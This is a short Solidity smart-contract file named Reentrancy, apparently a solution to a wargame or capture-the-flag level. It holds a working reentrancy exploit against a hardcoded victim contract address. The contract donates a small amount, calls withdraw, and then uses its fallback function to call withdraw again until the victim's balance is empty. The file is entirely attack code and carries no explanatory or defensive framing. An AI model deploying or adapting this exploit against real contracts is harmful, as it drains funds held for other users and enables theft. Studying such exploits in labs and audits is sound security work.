// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface IVictim {
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
    function donate(address _to) external payable;
}
contract Reentrancy {
    address instance = 0xAb953A0Df9F8b2d36527Ce019Aab9D66bF40D852;

    constructor() {}
    
    function attack() external payable {
        IVictim(instance).donate{ value: 0.001 ether}(address(this));
        IVictim(instance).withdraw(IVictim(instance).balanceOf(address(this)));
    }
    fallback() external payable {
        if (address(instance).balance > 0) {
            IVictim(instance).withdraw(IVictim(instance).balanceOf(address(this)));
        }
    }

}